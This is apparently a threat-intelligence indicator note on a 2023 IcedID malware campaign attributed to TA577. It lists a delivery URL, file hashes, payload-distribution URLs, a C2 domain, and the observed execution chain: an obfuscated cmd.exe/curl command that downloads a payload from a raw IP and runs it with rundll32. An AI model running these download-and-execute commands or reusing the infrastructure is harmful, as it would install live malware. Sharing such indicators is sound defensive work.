@@ -1,0 +1,36 @@
+IcedID | 09.26.2023 | Campaign 2678990133 | TA577 |
+
+***************************************
+
+.url https://themarijuanashow.com/rt/
+.xll 310b9b7f54880f2142882e39637d73dfc8542eab06ac1bb9ec597b801979b4d8
+.dll f45d0303851f913cef47b612211d603449cedaab4df3484048c8473b9d71d96a
+
+***************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\Sr.xll"
+
+cmd.exe /c c^u^r^l -o c:\users\public\9y.dat http://135.125.177.95/syK/3IldTx&&timeout 15&&rundll32 c:\users\public\9y.dat scab /k besogon728
+
+curl  -o c:\users\public\9y.dat http://135.125.177.95/syK/3IldTx
+
+timeout  15
+
+rundll32  c:\users\public\9y.dat scab /k besogon728
+
+***************************************
+
+.dll distro
+
+http://135.125.177.82/UMYApd4/8tX
+http://95.164.17.59/ZIbr7/9ei
+
+***************************************
+
+c2 downloader
+
+http://skrgerona.com/
+
+***************************************
